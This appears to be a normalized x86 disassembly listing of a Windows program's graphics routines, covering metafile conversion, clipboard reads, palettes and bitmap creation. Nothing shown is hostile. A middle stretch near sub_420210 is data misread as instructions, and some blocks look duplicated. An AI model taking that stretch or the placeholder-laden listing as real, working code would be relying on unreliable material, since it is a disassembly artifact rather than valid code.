call sub_41f8f4
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_41d790
lea eax [ ebp - 0x22 ]
call sub_41e5e0
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call sub_405fa4
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call sub_405fa4
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_41fbc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41d790
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbce
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026dc
retn
call sub_41d790
sub_41fbd8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fc7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_41fc5d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4082c4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40bfa0
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404284
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ece4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc64
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_41fcb8
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41f8f4
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_405fa4
mov edx eax
mov eax ebx
call sub_41fd2c
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call sub_405fa4
mov edx eax
mov eax ebx
call sub_41fd2c
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_41fd2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_41f8f4
pop esi
pop ebx
retn
mov eax ebx
call sub_41fe7c
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41fd68
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_41f8f4
pop esi
pop ebx
retn
mov eax ebx
call sub_41fe7c
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41fda8
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41f8f4
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_405fa4
mov edx eax
mov eax ebx
call sub_41fd68
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call sub_405fa4
mov edx eax
mov eax ebx
call sub_41fd68
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_41fe1c
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415510
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_41fe7c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_41f8f4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_4205c8
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_4205c4
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_41ff00
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_415510
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_42000c
mov edx ebx
mov eax esi
call sub_41ff80
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41ff80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fffc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
sub_42000c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402b3c
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_415774
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42012e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
call sub_41d7f0
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_405fa4
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_405fa4
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_41e5e0
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420147
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420127
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_420154
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_41f8f4
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_41d760
sub_4201d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_420210
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edx ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] dh
jae r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esp + eax ] cl
inc edx
add [ eax + 0x3f ] bl
inc ecx
add [ eax + 0x3f ] ah
inc ecx
add [ esi + edi + 0x41 ] dh
add ah bh
aad 0x41
add al ch
aad 0x41
add al bl
add al 0x42
add [ 0x74694254 ] cl
insd
popad
jo r-xdata
inc eax
add [ eax + 0x2 ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax + 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
rol [ edx + eax + 0xd070042 ] 0x54
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
jbe r-xdata
rcl [ ebp + 0x68 ] 0x46
add eax [ edx ]
popad
outsb
jbe r-xdata
add [ eax + esi * 4 ] ch
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ fs : eax ] al
inc edx
add [ eax + eax ] ah
rcl [ ebp + 0x68 ] 0x1e
add eax [ edx ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42034d
mov eax [ rw-data ]
call sub_413c88
retn
mov [ ebp - 0x4 ] eax
call sub_4138b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d318
test al al
je r-xdata
add al [ edx ]
cwde
mov al 0x41
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_420438
xor eax eax
pop edx
xor eax eax
push ebp
push sub_42031e
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d374
retn
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413c24
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420346
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
sub_4202a8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413c24
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420346
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42034d
mov eax [ rw-data ]
call sub_413c88
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42031e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_420438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d374
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4138b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d318
test al al
je r-xdata
sub_420354
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413c24
mov esi eax
xor ecx ecx
push ebp
push sub_4203c4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
mov edx ebx
mov eax esi
call sub_4138b8
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_420438
sub_4203d0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41ce98
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_42040c
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
call sub_420438
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41cf5c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_420438
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d194
xor edx edx
push ebp
push sub_4204cc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d520
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d374
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_4204d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d194
xor eax eax
push ebp
push sub_4205b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4217f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_420354
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4218f4
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d520
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413b9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d374
retn
sub_4205c8
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403128
sub_4205e8
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_420354
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40cc70
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_420644
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41b7cc
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_420354
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_420354
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_420690
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41e02c
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42073f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42074c
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_420798
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_420354
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41d898
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41d898
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_420de6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026bc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_420af0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41d778
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41d898
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41d898
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d898
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41d898
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_420d97
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_420d86
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
